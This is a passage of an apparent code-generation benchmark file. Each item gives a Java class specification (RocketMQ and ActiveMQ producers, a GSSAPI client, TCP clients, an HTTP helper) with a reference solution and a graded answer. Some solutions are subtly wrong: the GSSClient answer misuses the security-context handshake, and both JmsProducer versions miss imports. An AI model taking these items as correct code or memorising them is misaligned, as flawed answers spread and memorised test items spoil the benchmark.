    "Instruction": "Task Description: Create a Java class that implements an asynchronous message producer using RocketMQ, capable of sending messages to a specified topic with tags and keys, and handling success/failure callbacks.\n\nClass Description: AsyncProducer is a RocketMQ asynchronous message producer class that initializes a producer instance, sends messages asynchronously to a specified topic, and provides shutdown capability. It handles message sending callbacks for success and failure scenarios.\n\nAttributes:\nproducer: DefaultMQProducer - The RocketMQ producer instance responsible for sending messages\n\nMethods:\nAsyncProducer: [Constructor](String producerGroup, String namesrvAddr) -> void - Initializes the producer with a producer group name and NameServer address, sets retry policy for async sends, and starts the producer instance\nsendAsyncMessage: [Method](String topic, String tags, String keys, String body) -> void - Creates and sends an asynchronous message to the specified topic with given tags and keys, using the provided message body\nshutdown: [Method]() -> void - Shuts down the producer instance gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\nimport java.io.UnsupportedEncodingException;\n\npublic class AsyncProducer {\n\n    private DefaultMQProducer producer;\n\n    public AsyncProducer(String producerGroup, String namesrvAddr) throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setRetryTimesWhenSendAsyncFailed(0);\n        producer.start();\n    }\n\n    public void sendAsyncMessage(String topic, String tags, String keys, String body) throws UnsupportedEncodingException {\n        Message msg = new Message(topic, \n                                tags, \n                                keys, \n                                body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        try {\n            producer.send(msg, new SendCallback() {\n                @Override\n                public void onSuccess(SendResult sendResult) {\n                    System.out.printf(\"OK %s %n\", sendResult.getMsgId());\n                }\n\n                @Override\n                public void onException(Throwable e) {\n                    System.out.printf(\"Exception %s %n\", e);\n                    e.printStackTrace();\n                }\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class AsyncProducer {\n    private final DefaultMQProducer producer;\n\n    public AsyncProducer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n        this.producer.setRetryTimesWhenSendAsyncFailed(10);\n        try {\n            this.producer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendAsyncMessage(String topic, String tags, String keys, String body) {\n        Message msg = new Message(topic, tags, keys, body.getBytes());\n        producer.send(msg, new SendCallback() {\n            @Override\n            public void onSuccess(SendResult sendResult) {\n                System.out.println(\"Message sent successfully: \" + sendResult.getMsgId());\n            }\n\n            @Override\n            public void onException(Throwable e) {\n                System.err.println(\"Failed to send message: \" + e.getMessage());\n            }\n        });\n    }\n\n    public void shutdown() {\n        this.producer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 398,
    "Instruction": "Task Description: Implement a Java class that establishes a secure TCP client connection using GSSAPI for authentication and secure message exchange with a server.\n\nClass Description: The GSSClient class provides functionality to connect to a server using TCP, establish a secure GSSAPI context, send encrypted messages, and verify received messages. It handles GSSAPI authentication and secure communication over a socket connection.\n\nAttributes:\n- s: Socket - The socket used for TCP communication with the server\n\nMethods:\n- main(String[] args) -> void - Entry point that parses command line arguments, establishes connection, and manages the secure communication flow\n- createCtxt(String serverName, Oid mechOid) -> GSSContext - Creates and establishes a GSSAPI security context with the server\n- sendMsgToPeer(GSSContext aCtxt, String msg) -> void - Sends an encrypted message to the server using the established security context\n- verifyMsgFromPeer(GSSContext aCtxt, String msg) -> void - Verifies the message integrity code (MIC) received from the server\n- usage() -> void - Prints usage information for the program\n- print(String msg) -> void - Helper method to print messages to standard output\n- exit(int status) -> void - Closes the socket connection and exits the program with specified status code",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\n\nimport com.sun.gssapi.*;\n\nclass GSSClient {\n\n    private static Socket s;\n\n    public static void main(String args[]) {\n        String serverHost, serverName, message;\n        int port = 4444;\n\n        if (args.length < 3) {\n            usage();\n            exit(1);\n        }\n\n        serverHost = args[args.length - 3];\n        serverName = args[args.length - 2];\n        message = args[args.length - 1];\n        \n        try {\n            Oid mechOid = GSSManager.getDefaultMech();\n\n            for (int i = 0; i < (args.length - 3); i++) {\n                if (args[i].equals(\"-port\")) {\n                    if (i >= (args.length - 4)) {\n                        usage();\n                        exit(-1);\n                    }\n                    port = Integer.parseInt(args[++i]);\n                } else if (args[i].equals(\"-mech\")) {\n                    if (i >= (args.length-4)) {\n                        usage();\n                        exit(-1);\n                    }\n                    mechOid = new Oid(args[++i]);\n                }\n            }\n\n            s = new Socket(serverHost, port);\n            GSSContext aCtxt = createCtxt(serverName, mechOid);\n            sendMsgToPeer(aCtxt, message);                        \n            verifyMsgFromPeer(aCtxt, message);\n            aCtxt.dispose();\n            exit(0);\n\n        } catch (IOException e) {\n            print(\"\\n**Communication ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        } catch (GSSException e) {\n            print(\"\\n**GSSAPI ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        }\n    }\n\n    private static GSSContext createCtxt(String serverName, Oid mechOid)\n                    throws GSSException, IOException {\n        GSSContext aCtxt = new GSSContext(\n            new GSSName(serverName, GSSName.NT_HOSTBASED_SERVICE),\n                      mechOid, null, 0);\n\n        aCtxt.requestConf(true);\n        aCtxt.requestInteg(true);\n        aCtxt.requestMutualAuth(true);\n        aCtxt.requestReplayDet(true);\n        aCtxt.requestSequenceDet(true);\n        \n        DataInputStream dis = new DataInputStream(s.getInputStream());\n        DataOutputStream dos = new DataOutputStream(s.getOutputStream());\n\n        byte []inTok = new byte[0];\n        \n        do {\n            byte[] outTok = aCtxt.init(inTok, 0, inTok.length);\n            \n            if (outTok != null) {\n                dos.writeInt(outTok.length);\n                dos.write(outTok, 0, outTok.length);\n            }\n            \n            if (aCtxt.isEstablished())\n                break;\n            \n            inTok = new byte[dis.readInt()];\n            dis.readFully(inTok, 0, inTok.length);\n        } while (true);\n            \n        return (aCtxt);\n    }\n\n    private static void sendMsgToPeer(GSSContext aCtxt, String msg)\n                throws GSSException, IOException {\n        MessageProp mInfo = new MessageProp(0, true);\n        byte []tok = aCtxt.wrap(msg.getBytes(), 0, msg.length(), mInfo);\n        DataOutputStream dos = new DataOutputStream(s.getOutputStream());\n        dos.writeInt(tok.length);\n        dos.write(tok);\n        dos.flush();\n    }\n\n    private static void verifyMsgFromPeer(GSSContext aCtxt, String msg)\n                throws GSSException, IOException {\n        DataInputStream dis = new DataInputStream(s.getInputStream());\n        int len = dis.readInt();\n        MessageProp mInfo = new MessageProp();\n        aCtxt.verifyMIC(dis, new StringBufferInputStream(msg), mInfo);\n    }\n\n    private static void usage() {\n        print(\"GSSClient [-port port] [-mech 1.2.3.3] serverhost servername message\");\n    }\n\n    private static void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private static void exit(int status) {\n        if (s != null) {\n            try {\n                s.close();\n            } catch (IOException e) {};\n        }\n        System.exit(status);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.Socket;\nimport org.ietf.jgss.*;\n\npublic class GSSClient {\n    private Socket s;\n\n    public static void main(String[] args) {\n        if (args.length != 2) {\n            new GSSClient().usage();\n            System.exit(1);\n        }\n        try {\n            GSSClient client = new GSSClient();\n            client.s = new Socket(args[0], Integer.parseInt(args[1]));\n            GSSContext context = client.createCtxt(\"server@hostname\", new Oid(\"1.3.6.1.5.5.2\"));\n            client.sendMsgToPeer(context, \"Hello Server\");\n            client.verifyMsgFromPeer(context, \"Response from Server\");\n        } catch (Exception e) {\n            e.printStackTrace();\n            System.exit(1);\n        }\n    }\n\n    private GSSContext createCtxt(String serverName, Oid mechOid) throws Exception {\n        GSSManager manager = GSSManager.getInstance();\n        GSSCredential credential = manager.createCredential(null, GSSCredential.DEFAULT_LIFETIME,\n                new Oid[]{mechOid}, GSSCredential.INITIATE_ONLY);\n        GSSName targetName = manager.createName(serverName, GSSName.NT_HOSTBASED_SERVICE);\n        return manager.createContext(targetName, mechOid, credential, GSSContext.DEFAULT_LIFETIME);\n    }\n\n    private void sendMsgToPeer(GSSContext aCtxt, String msg) throws Exception {\n        byte[] token = aCtxt.initSecContext(new byte[0], 0, 0);\n        OutputStream out = s.getOutputStream();\n        DataOutputStream dos = new DataOutputStream(out);\n        dos.writeInt(token.length);\n        dos.write(token);\n        dos.flush();\n    }\n\n    private void verifyMsgFromPeer(GSSContext aCtxt, String msg) throws Exception {\n        InputStream in = s.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n        int length = dis.readInt();\n        byte[] token = new byte[length];\n        dis.readFully(token);\n        aCtxt.acceptSecContext(token, 0, length);\n        // Additional logic to verify message integrity\n    }\n\n    private void usage() {\n        System.out.println(\"Usage: java GSSClient <server> <port>\");\n    }\n\n    private void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private void exit(int status) {\n        try {\n            s.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        System.exit(status);\n    }\n}\n```"
  },
  {
    "Task_id": 399,
    "Instruction": "Task Description: Create a TCP client class in Java that establishes a connection to a server, sends data to the server, and properly closes the connection.\n\nClass Description: The `TcpClient` class provides functionality to connect to a TCP server, send data to it, and manage the connection lifecycle. It encapsulates the socket and output stream for communication.\n\nAttributes:\n- socket: Socket - The socket object used for the TCP connection\n- out: OutputStream - The output stream for sending data to the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port\n- sendData(String data) -> void - Converts the input string to UTF-8 bytes and sends it to the server\n- close() -> void - Closes the output stream and socket connection",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class TcpClient {\n    private Socket socket;\n    private OutputStream out;\n\n    public void connect(String host, int port) throws IOException {\n        socket = new Socket(host, port);\n        out = socket.getOutputStream();\n    }\n\n    public void sendData(String data) throws IOException {\n        byte[] outputBytes = data.getBytes(\"UTF-8\");\n        out.write(outputBytes);\n        out.flush();\n    }\n\n    public void close() throws IOException {\n        if (out != null) {\n            out.close();\n        }\n        if (socket != null) {\n            socket.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class TcpClient {\n    private Socket socket;\n    private OutputStream out;\n\n    public void connect(String host, int port) throws Exception {\n        socket = new Socket(host, port);\n        out = socket.getOutputStream();\n    }\n\n    public void sendData(String data) throws Exception {\n        byte[] bytes = data.getBytes(\"UTF-8\");\n        out.write(bytes);\n        out.flush();\n    }\n\n    public void close() throws Exception {\n        if (out != null) out.close();\n        if (socket != null) socket.close();\n    }\n}\n```"
  },
  {
    "Task_id": 4,
    "Instruction": "Task Description: Create a Java class that implements an ActiveMQ message producer capable of sending messages to both queues and topics.\n\nClass Description: The JmsProducer class is responsible for establishing a connection to an ActiveMQ broker, creating both queue and topic destinations, and sending multiple text messages to each destination. It handles connection management and includes error handling for JMS operations.\n\nAttributes:\n- USERNAME: [String] - Default username for ActiveMQ connection (default: ActiveMQConnection.DEFAULT_USER)\n- PASSWORD: [String] - Default password for ActiveMQ connection (default: ActiveMQConnection.DEFAULT_PASSWORD)\n- BROKEURL: [String] - Default broker URL for ActiveMQ connection (default: ActiveMQConnection.DEFAULT_BROKER_URL)\n- SENDNUM: [int] - Number of messages to send to each destination (default: 10)\n\nMethods:\n- run(): [void] - Main method that establishes the connection, creates destinations (queue and topic), and initiates message sending. Handles connection lifecycle and error cases.\n- sendMessage(Session session, MessageProducer messageProducer, String type): [void] - Helper method that creates and sends multiple text messages with timestamps to the specified destination. \n  Parameters:\n    - session: [Session] - JMS session for message creation\n    - messageProducer: [MessageProducer] - Producer for sending messages\n    - type: [String] - Destination type identifier (\"QUEUE\" or \"TOPIC\") for logging purposes",
    "Canonical_solution": "import javax.jms.Connection;\nimport javax.jms.ConnectionFactory;\nimport javax.jms.Destination;\nimport javax.jms.JMSException;\nimport javax.jms.MessageProducer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnection;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsProducer {\n\n    private static final String USERNAME = ActiveMQConnection.DEFAULT_USER;\n    private static final String PASSWORD = ActiveMQConnection.DEFAULT_PASSWORD;\n    private static final String BROKEURL = ActiveMQConnection.DEFAULT_BROKER_URL;\n    private static final int SENDNUM = 10;\n\n    public static void run() {\n        ConnectionFactory connectionFactory;\n        Connection connection = null;\n        Session session;\n        Destination destination;\n        MessageProducer messageProducer;\n        \n        connectionFactory = new ActiveMQConnectionFactory(JmsProducer.USERNAME, JmsProducer.PASSWORD, JmsProducer.BROKEURL);\n        try {\n            connection = connectionFactory.createConnection();\n            connection.start();\n            session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);\n            destination = session.createQueue(\"SAMPLE_MQ_QUEUE\");\n            messageProducer = session.createProducer(destination);\n            sendMessage(session, messageProducer, \"QUEUE\");\n\n            destination = session.createTopic(\"SAMPLE_MQ_TOPIC\");\n            messageProducer = session.createProducer(destination);\n            sendMessage(session, messageProducer, \"TOPIC\");\n            session.commit();\n            Thread.sleep(1000);\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (connection != null) {\n                try {\n                    connection.close();\n                } catch (JMSException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public static void sendMessage(Session session, MessageProducer messageProducer, String type) throws Exception {\n        for (int i = 0; i < JmsProducer.SENDNUM; i++) {\n            Date date = new Date();\n            TextMessage message = session.createTextMessage(\"ActiveMQ \u53d1\u9001\u6d88\u606f\u65f6\u95f4\uff1a\" + date);\n            System.out.println(\"\\t\" + type + \"\\t\u53d1\u9001\u6d88\u606f\uff1aActivemq \u53d1\u9001\u6d88\u606f\u65f6\u95f4\uff1a\" + date);\n            messageProducer.send(message);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 38,
    "right_result": "```java\nimport javax.jms.*;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsProducer {\n    private static final String USERNAME = ActiveMQConnection.DEFAULT_USER;\n    private static final String PASSWORD = ActiveMQConnection.DEFAULT_PASSWORD;\n    private static final String BROKEURL = ActiveMQConnection.DEFAULT_BROKER_URL;\n    private static final int SENDNUM = 10;\n\n    public void run() {\n        ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(USERNAME, PASSWORD, BROKEURL);\n        try (Connection connection = connectionFactory.createConnection()) {\n            connection.start();\n            Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n\n            Destination queue = session.createQueue(\"TEST.QUEUE\");\n            Destination topic = session.createTopic(\"TEST.TOPIC\");\n\n            sendMessage(session, createProducer(session, queue), \"QUEUE\");\n            sendMessage(session, createProducer(session, topic), \"TOPIC\");\n\n            session.close();\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void sendMessage(Session session, MessageProducer messageProducer, String type) throws JMSException {\n        for (int i = 0; i < SENDNUM; i++) {\n            TextMessage message = session.createTextMessage(\"Message \" + i + \" sent at \" + System.currentTimeMillis());\n            messageProducer.send(message);\n            System.out.println(type + \": Sent message \" + i);\n        }\n    }\n\n    private MessageProducer createProducer(Session session, Destination destination) throws JMSException {\n        return session.createProducer(destination);\n    }\n\n    public static void main(String[] args) {\n        new JmsProducer().run();\n    }\n}\n```"
  },
  {
    "Task_id": 40,
    "Instruction": "Task Description: Create a Java class that facilitates HTTP communication using Java's HttpClient, supporting GET requests with configurable options and error handling.\n\nClass Description: The HttpCommunicator class provides functionality to send HTTP GET requests to specified URIs. It includes features like automatic redirect following and optional error suppression for non-critical requests. The class encapsulates the HttpClient instance and provides methods for request execution.\n\nAttributes:\nhttpClient: [HttpClient] - The underlying HttpClient instance used for all HTTP communications, configured to always follow redirects.\n\nMethods:\nsendGetRequest: [Name](String uri, Map<String, Object> attributes) -> String - Sends a GET request to the specified URI. The attributes map can contain optional parameters like \"optional-option\" to suppress exceptions for non-critical requests. Returns the response body as a string or empty string for optional failed requests.\n\nreadUri: [Name](URI uri, boolean optional) -> String - Internal method that constructs and executes the HTTP request. If optional is true, returns empty string on failure instead of throwing an exception.\n\nisHttpOrHttps: [Name](String url) -> boolean - Helper method to check if a URL string uses HTTP or HTTPS protocol. Returns true if the URL starts with \"http://\" or \"https://\".",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.Map;\n\npublic class HttpCommunicator {\n\n    private HttpClient httpClient;\n\n    public HttpCommunicator() {\n        this.httpClient = HttpClient.newBuilder()\n                .followRedirects(HttpClient.Redirect.ALWAYS)\n                .build();\n    }\n\n    public String sendGetRequest(String uri, Map<String, Object> attributes) {\n        boolean isOptional = attributes.containsKey(\"optional-option\");\n        return readUri(URI.create(uri), isOptional);\n    }\n\n    private String readUri(URI uri, boolean optional) {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(uri)\n                .GET()\n                .build();\n        try {\n            return httpClient.send(request, HttpResponse.BodyHandlers.ofString()).body();\n        } catch (Exception e) {\n            if (optional) {\n                return \"\";\n            } else {\n                throw new RuntimeException(e);\n            }\n        }\n    }\n\n    private boolean isHttpOrHttps(String url) {\n        return url != null && (url.startsWith(\"http://\") || url.startsWith(\"https://\"));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.Map;\n\npublic class HttpCommunicator {\n    private final HttpClient httpClient = HttpClient.newBuilder()\n            .followRedirects(HttpClient.Redirect.ALWAYS)\n            .build();\n\n    public String sendGetRequest(String uri, Map<String, Object> attributes) {\n        try {\n            return readUri(new URI(uri), attributes.containsKey(\"optional-option\"));\n        } catch (Exception e) {\n            if (attributes.containsKey(\"optional-option\")) {\n                return \"\";\n            }\n            throw new RuntimeException(e);\n        }\n    }\n\n    private String readUri(URI uri, boolean optional) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(uri)\n                .GET()\n                .build();\n        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        if (response.statusCode() == 200) {\n            return response.body();\n        } else if (optional) {\n            return \"\";\n        } else {\n            throw new RuntimeException(\"HTTP request failed with status code: \" + response.statusCode());\n        }\n    }\n\n    public static boolean isHttpOrHttps(String url) {\n        return url.startsWith(\"http://\") || url.startsWith(\"https://\");\n    }\n}\n```"
  },
  {
    "Task_id": 400,
    "Instruction": "Task Description: Create a TCP client class in Java that establishes a connection to a server, allows sending messages to the server, and receives echoed responses until the termination command is sent.\n\nClass Description: The EchoClient class represents a TCP client that connects to a specified server host and port. It provides functionality for sending user input to the server and displaying the server's response, continuing this echo process until the user sends \"bye\" to terminate the connection.\n\nAttributes:\n- client: Socket - The socket used for the TCP connection to the server\n- input: BufferedReader - Reads user input from the console\n- buf: BufferedReader - Reads data from the server's response stream\n- out: PrintStream - Writes data to the server's output stream\n\nMethods:\n- EchoClient(String host, int port) -> void - Constructor that establishes a connection to the specified host and port, initializing the input/output streams\n- start() -> void - Starts the client interaction loop, reading user input and sending it to the server while displaying responses\n- close() -> void - Closes all open streams and the socket connection",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.net.Socket;\n\npublic class EchoClient {\n\n    private Socket client;\n    private BufferedReader input;\n    private BufferedReader buf;\n    private PrintStream out;\n\n    public EchoClient(String host, int port) throws Exception {\n        client = new Socket(host, port);\n        input = new BufferedReader(new InputStreamReader(System.in));\n        buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n        out = new PrintStream(client.getOutputStream());\n    }\n\n    public void start() throws Exception {\n        boolean flag = true;\n        while (flag) {\n            System.out.print(\"\u8f93\u5165\u4fe1\u606f\uff1a\");\n            String str = input.readLine();\n            out.println(str);\n            if (\"bye\".equals(str)) {\n                flag = false;\n            } else {\n                String echo = buf.readLine();\n                System.out.println(echo);\n            }\n        }\n        close();\n    }\n\n    public void close() throws Exception {\n        buf.close();\n        client.close();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class EchoClient {\n    private Socket client;\n    private BufferedReader input;\n    private BufferedReader buf;\n    private PrintStream out;\n\n    public EchoClient(String host, int port) throws IOException {\n        client = new Socket(host, port);\n        input = new BufferedReader(new InputStreamReader(System.in));\n        buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n        out = new PrintStream(client.getOutputStream());\n    }\n\n    public void start() throws IOException {\n        String userInput;\n        while ((userInput = input.readLine()) != null && !userInput.equalsIgnoreCase(\"bye\")) {\n            out.println(userInput);\n            System.out.println(\"Server: \" + buf.readLine());\n        }\n    }\n\n    public void close() throws IOException {\n        input.close();\n        buf.close();\n        out.close();\n        client.close();\n    }\n\n    public static void main(String[] args) {\n        try {\n            if (args.length != 2) {\n                System.out.println(\"Usage: java EchoClient <host> <port>\");\n                return;\n            }\n            EchoClient client = new EchoClient(args[0], Integer.parseInt(args[1]));\n            client.start();\n            client.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 401,
    "Instruction": "Task Description: Create a Java class that implements TCP client functionality for establishing a connection to a server, sending messages, and closing the connection.\n\nClass Description: The `SocketConnectTest` class provides basic TCP client capabilities using Java's Socket and I/O classes. It handles connection establishment, message transmission, and resource cleanup.\n\nAttributes:\n- client: [Socket] - The socket object representing the connection to the server\n- writer: [Writer] - The output stream writer for sending data to the server\n\nMethods:\n- connect: [connect(String host, int port)] -> [void] - Establishes a connection to the specified server host and port, initializing the socket and writer\n- sendMessage: [sendMessage(String message)] -> [void] - Sends the specified message to the connected server\n- close: [close()] -> [void] - Closes the writer and socket connection, releasing system resources",
    "Canonical_solution": "import java.io.*;\nimport java.net.Socket;\n\npublic class SocketConnectTest {\n\n    private Socket client;\n    private Writer writer;\n\n    public void connect(String host, int port) throws IOException {\n        client = new Socket(host, port);\n        writer = new OutputStreamWriter(client.getOutputStream());\n    }\n\n    public void sendMessage(String message) throws IOException {\n        writer.write(message);\n        writer.flush();\n    }\n\n    public void close() throws IOException {\n        writer.close();\n        client.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class SocketConnectTest {\n    private Socket client;\n    private Writer writer;\n\n    public void connect(String host, int port) throws IOException {\n        client = new Socket(host, port);\n        writer = new OutputStreamWriter(client.getOutputStream());\n    }\n\n    public void sendMessage(String message) throws IOException {\n        writer.write(message + \"\\n\");\n        writer.flush();\n    }\n\n    public void close() throws IOException {\n        if (writer != null) {\n            writer.close();\n        }\n        if (client != null) {\n            client.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 408,
    "Instruction": "Task Description: Create a Java class that implements a TCP client for basic communication with a server using Java's IO and networking capabilities.\n\nClass Description: The HelloClient class establishes a TCP connection to a specified server, receives messages from the server, and properly closes the connection when done. It uses Java's Socket and BufferedReader for network communication.\n\nAttributes:\n- client: Socket - The socket object representing the connection to the server\n- buf: BufferedReader - The buffered reader for receiving data from the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port\n  - Input: \n    - host: String - The server hostname or IP address\n    - port: int - The server port number\n  - Throws: Exception - If connection fails\n- receive() -> String - Reads a line of text from the server\n  - Returns: String - The received message from the server\n  - Throws: Exception - If reading fails\n- close() -> void - Closes the connection and cleans up resources\n  - Throws: Exception - If closing fails",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.Socket;\n\npublic class HelloClient {\n\n    private Socket client;\n    private BufferedReader buf;\n\n    public void connect(String host, int port) throws Exception {\n        client = new Socket(host, port);\n        InputStreamReader inputStreamReader = new InputStreamReader(client.getInputStream());\n        buf = new BufferedReader(inputStreamReader);\n    }\n\n    public String receive() throws Exception {\n        String str = buf.readLine();\n        return str;\n    }\n\n    public void close() throws Exception {\n        buf.close();\n        client.close();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.Socket;\n\npublic class HelloClient {\n    private Socket client;\n    private BufferedReader buf;\n\n    public void connect(String host, int port) throws Exception {\n        client = new Socket(host, port);\n        buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n    }\n\n    public String receive() throws Exception {\n        return buf.readLine();\n    }\n\n    public void close() throws Exception {\n        if (buf != null) buf.close();\n        if (client != null) client.close();\n    }\n}\n```"
  },
  {
    "Task_id": 410,
    "Instruction": "Task Description: Create a Java class that establishes a TCP connection to a server, sends commands, and receives responses, including the ability to list files and receive image data from the server.\n\nClass Description: The DeviceConnection class manages a TCP socket connection to a server, providing methods to interact with the server by sending commands and processing responses. It handles both text-based communication and binary image data transfer, with optional ZIP compression support.\n\nAttributes:\n- socket: Socket - The TCP socket connection to the server\n- reader: Reader - Inner class for reading data from the server\n- writer: Writer - Inner class for writing data to the server\n- USE_ZIP: boolean - Flag indicating whether to use ZIP compression for image data\n\nMethods:\n- DeviceConnection() -> void - Constructor that establishes a connection to the server at localhost:4242\n- close() -> void - Closes the socket connection\n- listLayoutFiles() -> ArrayList<String> - Requests and returns a list of layout files from the server\n- takePicture() -> Image - Requests an image from the server and returns it as a BufferedImage\n- complete() -> void - Verifies the completion of a server operation\n- Reader(InputStream) -> void - Inner class constructor for reading data\n- nextLine() -> String - Reads a line of text from the server (Reader class method)\n- Writer(OutputStream) -> void - Inner class constructor for writing data\n- println(String) -> void - Writes a line of text to the server (Writer class method)",
    "Canonical_solution": "import java.awt.Image;\nimport java.awt.image.BufferedImage;\nimport java.io.*;\nimport java.net.Socket;\nimport java.nio.ByteBuffer;\nimport java.nio.ByteOrder;\nimport java.nio.IntBuffer;\nimport java.util.ArrayList;\nimport java.util.zip.ZipInputStream;\n\npublic class DeviceConnection {\n    private static final boolean USE_ZIP = true;\n    private Socket socket;\n    private Reader reader;\n    private Writer writer;\n\n    public DeviceConnection() {\n        try {\n            socket = new Socket(\"localhost\", 4242);\n            reader = new Reader(socket.getInputStream());\n            writer = new Writer(socket.getOutputStream());\n        } catch (IOException e) {\n            System.err.println(\"Did you \\\"adb forward tcp:4242 tcp:4242\\\"\");\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public ArrayList<String> listLayoutFiles() {\n        ArrayList<String> files = new ArrayList<>();\n        if (writer == null) {\n            return files;\n        }\n        writer.println(\"LIST\");\n        boolean done = false;\n        while (!done) {\n            String response = reader.nextLine();\n            if (response.equals(\"DONE\")) {\n                done = true;\n            } else {\n                files.add(response);\n                System.out.println(\"Server response: \" + response);\n            }\n        }\n        return files;\n    }\n\n    public Image takePicture() {\n        writer.println(\"TAKE_PICTURE\");\n        String response = reader.nextLine();\n        int w = Integer.parseInt(response);\n        response = reader.nextLine();\n        int h = Integer.parseInt(response);\n        response = reader.nextLine();\n        int size = Integer.parseInt(response);\n        if (size == 0) {\n            complete();\n            return null;\n        }\n        byte[] bytes = new byte[size];\n        BufferedImage image = null;\n        try {\n            InputStream inputStream = reader.stream;\n            int offset = 0;\n            while (offset < size) {\n                int toRead = size - offset;\n                int read = inputStream.read(bytes, offset, toRead);\n                if (read > 0) {\n                    offset += read;\n                }\n            }\n            if (USE_ZIP) {\n                try {\n                    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n                    ZipInputStream zipInputStream = new ZipInputStream(byteArrayInputStream);\n                    zipInputStream.getNextEntry();\n                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n                    byte[] buff = new byte[32768];\n                    int len = 0;\n                    while ((len = zipInputStream.read(buff)) > 0) {\n                        byteArrayOutputStream.write(buff, 0, len);\n                    }\n                    zipInputStream.closeEntry();\n                    zipInputStream.close();\n                    bytes = byteArrayOutputStream.toByteArray();\n                } catch(IOException e){\n                    e.printStackTrace();\n                }\n            }\n\n            image = new BufferedImage(w, h, BufferedImage.TYPE_INT_ARGB);\n            IntBuffer intBuffer = ByteBuffer.wrap(bytes).order(ByteOrder.LITTLE_ENDIAN).asIntBuffer();\n            int[] array = new int[intBuffer.remaining()];\n            intBuffer.get(array);\n            for (int i = 0; i < array.length; i++) {\n                int pixel = array[i];\n                int alpha = (pixel >> 24) & 0xff;\n                int red = (pixel >> 16) & 0xff;\n                int green = (pixel >> 8) & 0xff;\n                int blue = (pixel) & 0xff;\n                array[i] = (alpha << 24) + (blue << 16) + (green << 8) + red;\n            }\n            image.getRaster().setDataElements(0, 0, w, h, array);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        complete();\n        return image;\n    }\n\n    private class Reader {\n        DataInputStream stream;\n\n        Reader(InputStream stream) {\n            this.stream = new DataInputStream(stream);\n        